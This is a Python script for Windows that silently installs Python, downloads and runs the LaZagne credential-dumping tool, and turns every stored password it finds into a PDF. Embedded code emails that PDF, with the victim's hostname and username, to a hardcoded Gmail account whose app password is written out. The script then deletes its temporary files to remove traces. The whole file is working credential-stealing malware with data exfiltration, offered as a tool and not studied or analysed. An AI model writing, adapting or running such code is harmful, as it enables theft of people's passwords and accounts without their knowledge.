import os
import sys
import subprocess
import tempfile
import shutil
import requests
import smtplib
import ssl
import socket
import getpass
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class LaZagneOperations:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.lazagne_exe = os.path.join(self.temp_dir, "LaZagne.exe")
        self.lazagne_dir = os.path.join(self.temp_dir, "LaZagne")
        self.results_file = os.path.join(self.temp_dir, "lazagne_results.txt")
        self.pdf_file = os.path.join(self.temp_dir, "lazagne_results.pdf")
        self.python_script = os.path.join(self.temp_dir, "lazagne_email.py")
        self.log_dir = os.path.join(self.temp_dir, "logs")
        
        # Create directories
        os.makedirs(self.lazagne_dir, exist_ok=True)
        os.makedirs(self.log_dir, exist_ok=True)

    def run_command(self, cmd, capture_output=True):
        """Run a command and return the result"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=capture_output, text=True)
            return result.returncode == 0, result.stdout if capture_output else ""
        except Exception as e:
            return False, str(e)

    def install_python(self):
        """Check if Python is installed, install if not"""
        print("Checking for Python...")
        
        # Check if Python is already available
        success, _ = self.run_command("python --version")
        if success:
            print("Python is already installed.")
            return True
        
        print("Installing Python...")
        
        # Download Python installer
        python_installer = os.path.join(self.temp_dir, "python_installer.exe")
        try:
            response = requests.get("https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe", timeout=30)
            with open(python_installer, 'wb') as f:
                f.write(response.content)
        except Exception as e:
            print(f"Failed to download Python installer: {e}")
            return False
        
        # Install Python silently
        try:
            cmd = f'"{python_installer}" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0'
            success, _ = self.run_command(cmd, capture_output=False)
            
            # Clean up installer
            if os.path.exists(python_installer):
                os.remove(python_installer)
            
            if success:
                # Refresh environment to include Python in PATH
                os.environ['PATH'] = os.environ['PATH'] + ';C:\\Python310;C:\\Python310\\Scripts'
                
                # Verify installation
                success, version = self.run_command("python --version")
                if success:
                    print("Python installed successfully.")
                    return True
                else:
                    print("Python installation verification failed.")
                    return False
            else:
                print("Python installation failed.")
                return False
                
        except Exception as e:
            print(f"Python installation error: {e}")
            return False

    def install_packages(self):
        """Install required Python packages"""
        print("Installing required Python packages...")
        
        try:
            # Upgrade pip
            self.run_command("python -m pip install --upgrade pip --quiet")
            
            # Install packages
            success, _ = self.run_command("python -m pip install --quiet reportlab fpdf")
            if not success:
                print("Failed to install packages via command line, trying alternative method...")
                return self.install_packages_alternative()
            
            # Verify packages
            success, _ = self.run_command('python -c "import reportlab, fpdf"')
            if success:
                print("Packages installed successfully.")
                return True
            else:
                print("Failed to verify package installation.")
                return False
                
        except Exception as e:
            print(f"Package installation error: {e}")
            return False

    def install_packages_alternative(self):
        """Alternative method to install packages"""
        try:
            import pip
            pip.main(['install', '--quiet', 'reportlab', 'fpdf'])
            
            # Test imports
            try:
                import reportlab
                import fpdf
                print("Packages installed successfully (alternative method).")
                return True
            except ImportError:
                print("Failed to install packages with alternative method.")
                return False
                
        except Exception as e:
            print(f"Alternative package installation failed: {e}")
            return False

    def download_lazagne(self):
        """Download LaZagne executable"""
        print("Downloading LaZagne...")
        
        try:
            response = requests.get("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe", timeout=30)
            with open(self.lazagne_exe, 'wb') as f:
                f.write(response.content)
            
            if os.path.exists(self.lazagne_exe):
                print("LaZagne downloaded successfully.")
                return True
            else:
                print("LaZagne download failed - file not found.")
                return False
                
        except Exception as e:
            print(f"Failed to download LaZagne: {e}")
            return False

    def create_python_email_script(self):
        """Create the Python email script"""
        script_content = f'''import smtplib, ssl, socket, os, getpass, time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Set environmental variables
RESULTS_FILE = r"{self.results_file}"
PDF_FILE = r"{self.pdf_file}"

# Try to import reportlab with fallback
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.pdfgen import canvas
    reportlab_available = True
except ImportError:
    reportlab_available = False

try:
    import fpdf
    fpdf_available = True
except ImportError:
    fpdf_available = False

def send_email(subject, body, attachment_path=None):
    try:
        gmail_user = "github0987@gmail.com"
        gmail_app_password = "gwhl efna quvk qhqj"
        
        msg = MIMEMultipart()
        msg["From"] = gmail_user
        msg["To"] = gmail_user
        msg["Subject"] = subject
        msg["X-Priority"] = "1"
        
        msg.attach(MIMEText(body, "plain"))
        
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part["Content-Disposition"] = f"attachment; filename=\\"{{os.path.basename(attachment_path)}}\\""
            msg.attach(part)
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(gmail_user, gmail_app_password)
            server.sendmail(gmail_user, gmail_user, msg.as_string())
        return True
    except Exception as e:
        print(f"Email error: {{e}}")
        return False

def create_pdf(content, filename):
    if reportlab_available:
        try:
            c = canvas.Canvas(filename, pagesize=letter)
            text = c.beginText(40, 750)
            text.setFont("Helvetica", 10)
            
            lines = []
            for line in content.split("\\n"):
                while len(line) > 100:
                    lines.append(line[:100])
                    line = line[100:]
                lines.append(line)
            
            for line in lines:
                if text.getY() < 40:
                    c.drawText(text)
                    c.showPage()
                    text = c.beginText(40, 750)
                    text.setFont("Helvetica", 10)
                text.textLine(line)
            
            c.drawText(text)
            c.save()
            return True
        except Exception as e:
            pass
    
    if fpdf_available:
        try:
            pdf = fpdf.FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=10)
            
            for line in content.split("\\n"):
                pdf.cell(0, 5, line[:90], ln=True)
            
            pdf.output(filename)
            return True
        except Exception as e:
            pass
    
    try:
        with open(filename.replace(".pdf", ".txt"), "w") as f:
            f.write(content)
        return False
    except:
        return False

# Get system info
username = getpass.getuser()
hostname = socket.gethostname()
system_os = "Windows"

# Read results file
lazagne_output = ""
try:
    with open(RESULTS_FILE, "r", encoding="utf-8", errors="ignore") as f:
        lazagne_output = f.read()
except:
    lazagne_output = "Failed to read results file"

# Create PDF with results
pdf_created = create_pdf(lazagne_output, PDF_FILE)

# Send LaZagne results via email with PDF attachment
results_subject = "LaZagne Results from " + hostname
time_str = time.strftime("%Y-%m-%d %H:%M:%S")
results_body = "System: " + hostname + " (" + system_os + ")\\nUser: " + username + "\\nTime: " + time_str

if pdf_created:
    send_email(results_subject, results_body, PDF_FILE)
else:
    results_body += "\\n\\nLaZagne Output:\\n" + lazagne_output[:1500]
    send_email(results_subject, results_body)

# Final success notification
time_str = time.strftime("%Y-%m-%d %H:%M:%S")
send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)

print("All operations completed successfully. Check your email for details.")
'''
        
        try:
            with open(self.python_script, 'w', encoding='utf-8') as f:
                f.write(script_content)
            return True
        except Exception as e:
            print(f"Failed to create Python script: {e}")
            return False

    def run_lazagne(self):
        """Run LaZagne and capture results"""
        print("Running LaZagne to retrieve stored credentials...")
        
        try:
            # Change to LaZagne directory and run
            original_dir = os.getcwd()
            os.chdir(self.lazagne_dir)
            
            # Run LaZagne
            cmd = f'"{self.lazagne_exe}" all'
            success, output = self.run_command(cmd)
            
            # Write results to file
            with open(self.results_file, 'w', encoding='utf-8') as f:
                f.write(output if success else "LaZagne execution failed")
            
            os.chdir(original_dir)
            return True
            
        except Exception as e:
            print(f"Error running LaZagne: {e}")
            return False

    def send_results(self):
        """Send results via email using the created Python script"""
        print("Sending results via email...")
        
        try:
            success, output = self.run_command(f'python "{self.python_script}"')
            return success
        except Exception as e:
            print(f"Error sending results: {e}")
            return False

    def cleanup(self):
        """Clean up all temporary files and directories"""
        print("Starting cleanup process...")
        
        # Files to remove
        files_to_remove = [
            self.lazagne_exe,
            self.results_file,
            self.pdf_file,
            self.python_script
        ]
        
        # Add pattern-based files
        patterns = [
            os.path.join(self.temp_dir, "LaZagne*"),
            os.path.join(self.temp_dir, "lazagne_*"),
            os.path.join(self.temp_dir, "reportlab*"),
            os.path.join(self.temp_dir, "fpdf*")
        ]
        
        for pattern in patterns:
            try:
                for file in glob.glob(pattern):
                    if os.path.isfile(file):
                        os.remove(file)
            except:
                pass
        
        # Remove files
        for file_path in files_to_remove:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except:
                pass
        
        # Remove directories
        dirs_to_remove = [self.lazagne_dir, self.log_dir]
        for dir_path in dirs_to_remove:
            try:
                if os.path.exists(dir_path):
                    shutil.rmtree(dir_path)
            except:
                pass
        
        # Clear Python cache
        try:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    if file.endswith(('.pyc', '.pyo')):
                        os.remove(os.path.join(root, file))
                for dir in dirs:
                    if dir == '__pycache__':
                        shutil.rmtree(os.path.join(root, dir))
        except:
            pass
        
        print("Cleanup completed. All traces removed.")

    def main(self):
        """Main execution function"""
        print("Starting Windows LaZagne operation...")
        print("This may take several minutes. Please wait...")
        
        try:
            # Install Python if needed
            if not self.install_python():
                print("Python installation failed.")
                self.cleanup()
                return 1
            
            # Install packages
            if not self.install_packages():
                print("Package installation failed.")
                self.cleanup()
                return 1
            
            # Download LaZagne
            if not self.download_lazagne():
                print("LaZagne download failed.")
                self.cleanup()
                return 1
            
            # Create Python email script
            if not self.create_python_email_script():
                print("Failed to create Python script.")
                self.cleanup()
                return 1
            
            # Run LaZagne
            if not self.run_lazagne():
                print("LaZagne execution failed.")
                self.cleanup()
                return 1
            
            # Send results
            if not self.send_results():
                print("Failed to send results.")
                self.cleanup()
                return 1
            
            # Final cleanup
            self.cleanup()
            
            print("Operation completed successfully. All temporary files cleaned up.")
            input("Press Enter to continue...")
            return 0
            
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            self.cleanup()
            return 1

if __name__ == "__main__":
    # Import glob for pattern matching in cleanup
    import glob
    
    # Run the main operation
    operation = LaZagneOperations()
    sys.exit(operation.main())
